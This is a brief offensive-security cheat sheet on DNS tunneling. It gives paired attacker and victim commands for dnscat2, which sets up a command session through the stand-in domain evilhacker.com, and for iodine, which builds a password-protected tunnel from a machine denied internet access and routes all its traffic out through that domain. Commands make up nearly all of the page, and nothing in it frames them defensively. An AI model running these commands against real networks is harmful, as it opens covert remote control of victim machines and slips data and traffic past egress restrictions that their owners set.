# DNS Tunneling

{% embed url="https://github.com/mosajjal/dnspot" %}

## Dnscat2

```
# Attacker
sudo dnscat2-server --dns domain=evilhacker.com

# Victim
dnscat2 --dns domain=evilhacker.com
```

### Commands

```
# Attacker
window -i 1

help
```

## Iodine

```
# Attacker
sudo iodined 192.168.100.1 evilhacker.com -P password1

# Client (Not allowed to access internet)
# Creating a layer 3 vpn tunnel
sudo iodine evilhacker.com -P password1

sudo route add -net 0.0.0.0/0 gw 192.168.100.1 dns0

# now ping using the client machine
ping google.com

SUCCESS!
```

## References

* [https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)
* [https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)
